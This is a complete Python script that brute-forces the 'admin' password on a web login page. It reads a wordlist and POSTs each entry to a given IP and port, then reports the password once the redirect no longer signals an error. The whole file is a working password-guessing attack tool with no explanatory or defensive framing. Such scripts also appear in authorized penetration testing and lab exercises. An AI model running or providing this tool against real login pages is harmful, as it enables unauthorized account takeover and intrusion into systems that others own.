import sys
import requests
import argparse

base_url = "http://%s:%s" 
login_path = "/login"
username = "admin"

def get_wordlist_content(wordlist):
    with open(wordlist) as f:
        return f.read()

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-t', '--target', help='target ip', required=True)
    parser.add_argument('-p', '--port', help='target port', required=True)
    parser.add_argument('-w', '--wordlist', help='wordlist', required=True)
    return parser.parse_args()

def find_pass(target_url, wordlist):
    for passwd in get_wordlist_content(wordlist).split():
        login_data = { 'username':username, 'password': passwd }
        resp = requests.post(target_url, data=login_data, allow_redirects = False)
        if "error" not in resp.headers['location']:
            print("Found admin password! \n Password in cleartext: %s" % str(passwd))
            break

def main():
    args = parse_args()
    target_url = (base_url % (args.target, args.port)) + login_path
    find_pass(target_url, args.wordlist)

if __name__ == "__main__":
	main()
    
